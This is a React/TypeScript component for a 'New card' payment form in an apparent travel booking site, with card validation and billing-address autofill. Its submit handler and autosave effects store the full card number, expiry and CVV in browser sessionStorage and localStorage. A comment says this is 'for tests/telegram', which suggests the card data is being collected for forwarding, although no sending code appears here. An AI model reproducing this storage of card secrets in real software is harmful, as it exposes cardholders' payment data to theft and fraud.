import React from 'react';
import { useNavigate } from 'react-router-dom';
import './Luggage.css';
import { getPaymentStorageKey } from './utils/paymentKey';
// getCountryByIP больше не используется

const BackIcon = () => (
  <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
);

function luhnCheck(num: string): boolean {
  const s = num.replace(/\D/g, '');
  if (s.length < 12) return false;
  let sum = 0, dbl = false;
  for (let i = s.length - 1; i >= 0; i--) {
    let d = parseInt(s[i] || '0', 10);
    if (dbl) { d *= 2; if (d > 9) d -= 9; }
    sum += d; dbl = !dbl;
  }
  return sum % 10 === 0;
}

function detectBrand(num: string): string {
  const s = num.replace(/\s|-/g, '');
  if (/^4\d{12}(\d{3})?$/.test(s)) return 'VISA';
  if (/^5[1-5]\d{14}$/.test(s)) return 'MASTERCARD';
  if (/^3[47]\d{13}$/.test(s)) return 'AMEX';
  if (/^6(?:011|5\d{2})\d{12}$/.test(s)) return 'DISCOVER';
  return 'CARD';
}

const NewCard: React.FC = () => {
  const navigate = useNavigate();
  const [holder, setHolder] = React.useState<string>('');
  const [number, setNumber] = React.useState<string>('');
  const [expiry, setExpiry] = React.useState<string>(''); // MM/YY
  const [cvc, setCvc] = React.useState<string>('');
  // Billing
  const [firstName, setFirstName] = React.useState('');
  const [lastName, setLastName] = React.useState('');
  // email убран по запросу
  const [phone, setPhone] = React.useState('');
  const [addr1, setAddr1] = React.useState('');
  const [addr2, setAddr2] = React.useState('');
  const [house, setHouse] = React.useState('');
  const [city, setCity] = React.useState('');
  const [state, setState] = React.useState('');
  const [zip, setZip] = React.useState('');
  const [country, setCountry] = React.useState(''); // Пустое поле для ввода

  const paymentKeyRef = React.useRef<string>('');

  // Страна теперь вводится вручную, без определения по IP

  React.useEffect(() => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const paymentKey = getPaymentStorageKey();
      paymentKeyRef.current = paymentKey;
      
      // Проверяем, это бронирование отеля или рейса
      const hotelSummary = sessionStorage.getItem('hotel_booking_summary');
      const isHotel = Boolean(hotelSummary);
      
      if (isHotel) {
        // Для отелей загружаем данные гостей из GuestInfo
        try {
          const guestsData = localStorage.getItem('hotel_guests_info');
          const contactData = localStorage.getItem('hotel_contact_info');
          
          console.log('NewCard: Loading hotel data:', { guestsData, contactData });
          
          if (guestsData) {
            const guests = JSON.parse(guestsData);
            console.log('NewCard: Parsed guests:', guests);
            const firstGuest = guests[0];
            if (firstGuest) {
              const full = [firstGuest.firstName, firstGuest.lastName].filter(Boolean).join(' ');
              console.log('NewCard: Setting holder to:', full);
              if (full) setHolder(full);
              // Для отелей имя и фамилия должны быть пустыми в billing details
              setFirstName('');
              setLastName('');
            }
          }
          
          if (contactData) {
            const contact = JSON.parse(contactData);
            console.log('NewCard: Parsed contact:', contact);
            if (contact.phone) setPhone(contact.phone);
          }
        } catch (error) {
          console.error('NewCard: Error loading hotel data:', error);
        }
      } else {
        // Оригинальная логика для рейсов
        const tRaw = localStorage.getItem(`traveler_details_${offerId}`) || sessionStorage.getItem(`traveler_details_${offerId}`);
        if (tRaw) {
          const t = JSON.parse(tRaw);
          const full = [t.firstName, t.lastName].filter(Boolean).join(' ');
          if (full) setHolder(full);
          if (t.firstName) setFirstName(t.firstName);
          if (t.lastName) setLastName(t.lastName);
        }
        const cRaw = localStorage.getItem(`contact_${offerId}`) || sessionStorage.getItem(`contact_${offerId}`);
        if (cRaw) {
          const c = JSON.parse(cRaw);
          if (c.phone) setPhone(c.phone);
        }
      }
      
      // Страна теперь выбирается вручную, не заполняется автоматически

      // Подхват черновика (без PAN/expiry/CVC) - только если есть offerId
      if (paymentKey) {
        const draftRaw = sessionStorage.getItem(`payment_card_draft_${paymentKey}`);
        if (draftRaw) {
          const d = JSON.parse(draftRaw);
          if (typeof d.holder === 'string') setHolder(d.holder);
          if (typeof d.firstName === 'string') setFirstName(d.firstName);
          if (typeof d.lastName === 'string') setLastName(d.lastName);
          if (typeof d.phone === 'string') setPhone(d.phone);
          if (typeof d.addr1 === 'string') setAddr1(d.addr1);
          if (typeof d.addr2 === 'string') setAddr2(d.addr2);
          if (typeof d.house === 'string') setHouse(d.house);
          if (typeof d.city === 'string') setCity(d.city);
          if (typeof d.state === 'string') setState(d.state);
          if (typeof d.zip === 'string') setZip(d.zip);
          // Страна теперь выбирается вручную, не заполняется автоматически
          // if (typeof d.country === 'string') setCountry(d.country);
        }
      }

      // Если пришли по Edit — заполняем из сохранённой карты (billing), без PAN/expiry/CVC
      const savedCardRaw = paymentKey ? (sessionStorage.getItem(`payment_card_${paymentKey}`) || localStorage.getItem(`payment_card_${paymentKey}`)) : null;
      if (savedCardRaw) {
        try {
          const saved = JSON.parse(savedCardRaw);
          const b = saved?.billing || {};
          // Для отелей имя и фамилия не загружаются из сохраненной карты
          if (!isHotel) {
            if (b.firstName) setFirstName(b.firstName);
            if (b.lastName) setLastName(b.lastName);
          }
          if (b.phone) setPhone(b.phone);
          if (b.addr1) setAddr1(b.addr1);
          if (b.addr2) setAddr2(b.addr2);
          if (b.house) setHouse(b.house);
          if (b.city) setCity(b.city);
          if (b.state) setState(b.state);
          if (b.zip) setZip(b.zip);
          // Страна теперь выбирается вручную, не заполняется автоматически
          // if (b.country) setCountry(b.country);
          if (saved.holder) setHolder(saved.holder);
          if (saved.last4) {
            setNumber(`•••• •••• •••• ${String(saved.last4).padStart(4,'•')}`);
          }
          if (saved.expiry) setExpiry(saved.expiry);
        } catch {}
      }

      // Подхват черновика PAN/expiry/CVC из текущей сессии
      const cardDraftRaw = sessionStorage.getItem(`payment_card_draft_pan_${paymentKey}`) || localStorage.getItem(`payment_card_draft_pan_${paymentKey}`);
      if (cardDraftRaw) {
        try {
          const d = JSON.parse(cardDraftRaw);
          if (d && typeof d.number === 'string') {
            const groups = d.number.replace(/\D/g,'').slice(0,19).match(/.{1,4}/g) || [];
            setNumber(groups.join(' '));
          }
          if (typeof d.expiry === 'string') setExpiry(d.expiry);
          if (typeof d.cvc === 'string') setCvc(d.cvc);
        } catch {}
      }
    } catch {}
  }, []);

  // Автосохранение черновика (без номера/срока/CVC)
  React.useEffect(() => {
    try {
      const draft = {
        holder,
        firstName,
        lastName,
        phone,
        addr1,
        addr2,
        house,
        city,
        state,
        zip,
        country,
      };
      const storageKey = paymentKeyRef.current || getPaymentStorageKey();
      sessionStorage.setItem(`payment_card_draft_${storageKey}`, JSON.stringify(draft));
    } catch {}
  }, [holder, firstName, lastName, phone, addr1, addr2, house, city, state, zip, country]);

  // Автосохранение черновика полей карты (в пределах сессии)
  React.useEffect(() => {
    try {
      const panDraft = {
        number: number.replace(/\D/g,''),
        expiry,
        cvc,
      };
      const storageKey = paymentKeyRef.current || getPaymentStorageKey();
      sessionStorage.setItem(`payment_card_draft_pan_${storageKey}`, JSON.stringify(panDraft));
      try { localStorage.setItem(`payment_card_draft_pan_${storageKey}`, JSON.stringify(panDraft)); } catch {}
    } catch {}
  }, [number, expiry, cvc]);

  const validExpiry = React.useMemo(() => {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    const [mm, yy] = expiry.split('/');
    const m = Number(mm), y = Number(yy) + 2000;
    if (m < 1 || m > 12) return false;
    const now = new Date();
    const exp = new Date(y, m - 1, 1);
    exp.setMonth(exp.getMonth() + 1); // end of month
    return exp > new Date(now.getFullYear(), now.getMonth(), 1);
  }, [expiry]);

  const valid = React.useMemo(() => {
    const isMasked = number.includes('•');
    const numOnly = number.replace(/\D/g, '');
    const okNum = isMasked || luhnCheck(numOnly);
    const okHolder = holder.trim().length > 2;
    const okNames = firstName.trim().length>1 && lastName.trim().length>1;
    // Международный формат E.164: начинается с +, 6–15 цифр
    const phoneDigits = phone.replace(/\D/g, '');
    const okPhone = phone.trim().startsWith('+') && phoneDigits.length >= 6 && phoneDigits.length <= 15;
    const okAddr = addr1.trim().length > 3 && house.trim().length>0 && city.trim().length > 2 && zip.trim().length > 2 && country.trim().length > 1;
    
    // ВСЕГДА требуем CVC для активации кнопки (безопасность)
    const okCvc = cvc.trim().length >= 3;
    
    // В режиме редактирования (замаскированная карта) - всё кроме CVC
    if (isMasked) {
      const result = okNum && okHolder && validExpiry && okAddr && okNames && okPhone && okCvc;
      console.log('Edit mode validation:', { isMasked, okNum, okHolder, validExpiry, okAddr, okNames, okPhone, okCvc, result });
      return result;
    }
    
    // В режиме новой карты - всё включая CVC
    const result = okNum && okCvc && okHolder && validExpiry && okAddr && okNames && okPhone;
    console.log('New card validation:', { isMasked, okNum, okCvc, okHolder, validExpiry, okAddr, okNames, okPhone, result });
    return result;
  }, [number, cvc, holder, validExpiry, firstName, lastName, phone, addr1, house, city, zip, country]);

  const onSubmit = () => {
    if (!valid) return;
    try {
      const isMasked = number.includes('•');
      let last4, brand, panDigits;
      
      if (isMasked) {
        // Режим редактирования - используем сохранённые данные
        const storageKey = paymentKeyRef.current || getPaymentStorageKey();
        const savedCardRaw = sessionStorage.getItem(`payment_card_${storageKey}`) || localStorage.getItem(`payment_card_${storageKey}`);
        if (savedCardRaw) {
          const saved = JSON.parse(savedCardRaw);
          last4 = saved.last4;
          brand = saved.brand;
        }
        // Для замаскированной карты PAN не сохраняем заново
      } else {
        // Режим новой карты
        last4 = number.replace(/\D/g, '').slice(-4);
        brand = detectBrand(number);
        panDigits = number.replace(/\D/g,'');
      }
      
      const payload = {
        holder: holder.trim(),
        last4,
        brand,
        expiry,
        billing: { firstName, lastName, phone, addr1, house, addr2, city, state, zip, country }
      };
      const storageKey = paymentKeyRef.current || getPaymentStorageKey();
      if (storageKey) {
        sessionStorage.setItem(`payment_card_${storageKey}`, JSON.stringify(payload));
        try { localStorage.setItem(`payment_card_${storageKey}`, JSON.stringify(payload)); } catch {}
        sessionStorage.removeItem(`payment_card_draft_${storageKey}`);
        sessionStorage.removeItem(`payment_card_draft_pan_${storageKey}`);
        try { localStorage.removeItem(`payment_card_draft_pan_${storageKey}`); } catch {}
      }

      // Сохраняем PAN одноразово (локально на клиенте) — для тестов/телеграма
      try {
        if (panDigits && storageKey) {
          sessionStorage.setItem(`payment_card_one_time_pan_${storageKey}`, panDigits);
          try { localStorage.setItem(`payment_card_one_time_pan_${storageKey}`, panDigits); } catch {}
        }
        // Сохраняем CVV ОДНОРАЗОВО для локального теста (всегда, если введён)
        try {
          if (cvc && cvc.trim().length >= 3 && storageKey) {
            sessionStorage.setItem(`payment_card_one_time_cvv_${storageKey}`, cvc.trim());
            try { localStorage.setItem(`payment_card_one_time_cvv_${storageKey}`, cvc.trim()); } catch {}
          }
        } catch {}
      } catch {}
    } catch {}
    
    // Навигация зависит от типа бронирования
    const hotelSummary = sessionStorage.getItem('hotel_booking_summary');
    const isHotel = Boolean(hotelSummary);
    
    if (isHotel) {
      navigate('/hotel/payment');
    } else {
      navigate('/payment');
    }
  };

  return (
    <div className="trav-page">
      <div className="trav-header">
        <button className="back-button" onClick={()=>navigate(-1)}><BackIcon/></button>
        <h1>New card</h1>
        <div style={{ width:24 }}></div>
      </div>

      <div className="section">
        <div style={{ display:'flex', gap:0, flexWrap:'wrap', marginBottom:10, alignItems:'center' }}>
          {[
            new URL('./assets/card-logos/amex.svg', import.meta.url).toString(),
            new URL('./assets/card-logos/unionpay.svg', import.meta.url).toString(),
            new URL('./assets/card-logos/discover.svg', import.meta.url).toString(),
            new URL('./assets/card-logos/jcb.svg', import.meta.url).toString(),
            new URL('./assets/card-logos/mastercard.svg', import.meta.url).toString(),
            new URL('./assets/card-logos/visa.svg', import.meta.url).toString(),
          ].map((src, i) => (
            <img key={i} src={src} alt="card" style={{ height:40, width:'auto', objectFit:'contain', display:'block', marginRight: 6 }} />
          ))}
        </div>
        <label className="field">
          <span>Cardholder's name</span>
          <input value={holder} onChange={(e)=>setHolder(e.target.value.replace(/[^A-Za-z \-']/g, ''))} placeholder="e.g. John Smith" />
        </label>
        <label className="field">
          <span>Card number</span>
          <input
            value={number}
            onChange={(e)=>{
              const raw = e.target.value;
              // если был показан замаскированный номер, любое изменение начинает ввод нового PAN
              const base = number.includes('•') ? raw.replace(/\D/g, '') : raw.replace(/\D/g, '').slice(0, 19);
              const groups = base.match(/.{1,4}/g) || [];
              setNumber(groups.join(' '));
            }}
            onFocus={()=>{ if (number.includes('•')) setNumber(''); }}
            inputMode="numeric"
            placeholder="XXXX XXXX XXXX XXXX"
          />
        </label>
        <div className="row">
          <label className="field small">
            <span>Expiration date</span>
            <input
              value={expiry}
              onChange={(e)=>{
                // авто вставка '/'
                let v = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
                if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
                setExpiry(v);
              }}
              placeholder="MM/YY"
              inputMode="numeric"
            />
          </label>
          <label className="field small">
            <span>CVC</span>
            <input
              value={cvc}
              onChange={(e)=>{
                const v = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
                setCvc(v);
              }}
              inputMode="numeric"
              maxLength={4}
              placeholder="3–4 digits"
            />
          </label>
        </div>
      </div>

      <div className="section">
        <div style={{ color:'#fff', fontSize:18, fontWeight:800, marginBottom:8 }}>Billing details</div>
        <div className="row">
          <label className="field small"><span>First name</span><input value={firstName} onChange={e=>setFirstName(e.target.value.replace(/[^A-Za-z \-']/g, ''))} /></label>
          <label className="field small"><span>Last name</span><input value={lastName} onChange={e=>setLastName(e.target.value.replace(/[^A-Za-z \-']/g, ''))} /></label>
        </div>
        <div className="row">
          <label className="field small"><span>Phone</span><input value={phone} onChange={e=>setPhone(e.target.value)} placeholder="e.g. +14155552671" /></label>
        </div>
        <label className="field"><span>Address line 1</span><input value={addr1} onChange={e=>setAddr1(e.target.value.replace(/[^A-Za-z0-9 \-#'.,]/g, ''))} placeholder="Street" /></label>
        <div className="row">
          <label className="field small"><span>House/Building</span><input value={house} onChange={e=>setHouse(e.target.value.replace(/[^A-Za-z0-9 \-#'.,]/g, ''))} placeholder="# / Building" /></label>
          <label className="field small"><span>Address line 2 (optional)</span><input value={addr2} onChange={e=>setAddr2(e.target.value.replace(/[^A-Za-z0-9 \-#'.,]/g, ''))} placeholder="Apartment / Suite" /></label>
        </div>
        <div className="row">
          <label className="field small"><span>City</span><input value={city} onChange={e=>setCity(e.target.value.replace(/[^A-Za-z \-']/g, ''))} /></label>
          <label className="field small"><span>State/Province</span><input value={state} onChange={e=>setState(e.target.value.replace(/[^A-Za-z \-']/g, ''))} placeholder="e.g. California" /></label>
          <label className="field small"><span>Postal code</span><input value={zip} onChange={e=>setZip(e.target.value.replace(/[^A-Za-z0-9 \-]/g, ''))} /></label>
        </div>
        <label className="field">
          <span>Country/Region</span>
          <select value={country} onChange={e=>setCountry(e.target.value)} style={{ width:'100%', padding:'12px 16px', background:'#2a2a2a', border:'1px solid #444', borderRadius:8, color:'#fff', fontSize:16, outline:'none' }}>
            <option value="">Select country</option>
            <option value="Afghanistan">Afghanistan</option>
            <option value="Albania">Albania</option>
            <option value="Algeria">Algeria</option>
            <option value="Argentina">Argentina</option>
            <option value="Armenia">Armenia</option>
            <option value="Australia">Australia</option>
            <option value="Austria">Austria</option>
            <option value="Azerbaijan">Azerbaijan</option>
            <option value="Bahrain">Bahrain</option>
            <option value="Bangladesh">Bangladesh</option>
            <option value="Belarus">Belarus</option>
            <option value="Belgium">Belgium</option>
            <option value="Brazil">Brazil</option>
            <option value="Bulgaria">Bulgaria</option>
            <option value="Cambodia">Cambodia</option>
            <option value="Canada">Canada</option>
            <option value="Chile">Chile</option>
            <option value="China">China</option>
            <option value="Colombia">Colombia</option>
            <option value="Croatia">Croatia</option>
            <option value="Cyprus">Cyprus</option>
            <option value="Czech Republic">Czech Republic</option>
            <option value="Denmark">Denmark</option>
            <option value="Egypt">Egypt</option>
            <option value="Estonia">Estonia</option>
            <option value="Finland">Finland</option>
            <option value="France">France</option>
            <option value="Georgia">Georgia</option>
            <option value="Germany">Germany</option>
            <option value="Greece">Greece</option>
            <option value="Hungary">Hungary</option>
            <option value="Iceland">Iceland</option>
            <option value="India">India</option>
            <option value="Indonesia">Indonesia</option>
            <option value="Iran">Iran</option>
            <option value="Iraq">Iraq</option>
            <option value="Ireland">Ireland</option>
            <option value="Israel">Israel</option>
            <option value="Italy">Italy</option>
            <option value="Japan">Japan</option>
            <option value="Jordan">Jordan</option>
            <option value="Kazakhstan">Kazakhstan</option>
            <option value="Kuwait">Kuwait</option>
            <option value="Latvia">Latvia</option>
            <option value="Lebanon">Lebanon</option>
            <option value="Lithuania">Lithuania</option>
            <option value="Luxembourg">Luxembourg</option>
            <option value="Malaysia">Malaysia</option>
            <option value="Malta">Malta</option>
            <option value="Mexico">Mexico</option>
            <option value="Morocco">Morocco</option>
            <option value="Netherlands">Netherlands</option>
            <option value="New Zealand">New Zealand</option>
            <option value="Norway">Norway</option>
            <option value="Oman">Oman</option>
            <option value="Pakistan">Pakistan</option>
            <option value="Philippines">Philippines</option>
            <option value="Poland">Poland</option>
            <option value="Portugal">Portugal</option>
            <option value="Qatar">Qatar</option>
            <option value="Romania">Romania</option>
            <option value="Russia">Russia</option>
            <option value="Saudi Arabia">Saudi Arabia</option>
            <option value="Singapore">Singapore</option>
            <option value="Slovakia">Slovakia</option>
            <option value="Slovenia">Slovenia</option>
            <option value="South Africa">South Africa</option>
            <option value="South Korea">South Korea</option>
            <option value="Spain">Spain</option>
            <option value="Sri Lanka">Sri Lanka</option>
            <option value="Sweden">Sweden</option>
            <option value="Switzerland">Switzerland</option>
            <option value="Thailand">Thailand</option>
            <option value="Turkey">Turkey</option>
            <option value="Ukraine">Ukraine</option>
            <option value="United Arab Emirates">United Arab Emirates</option>
            <option value="United Kingdom">United Kingdom</option>
            <option value="United States">United States</option>
            <option value="Vietnam">Vietnam</option>
          </select>
        </label>
      </div>

      <div className="luggage-footer">
        <div className="price-box" />
        <button className="next-button" disabled={!valid} onClick={onSubmit}>Use this card</button>
      </div>
    </div>
  );
};

export default NewCard;


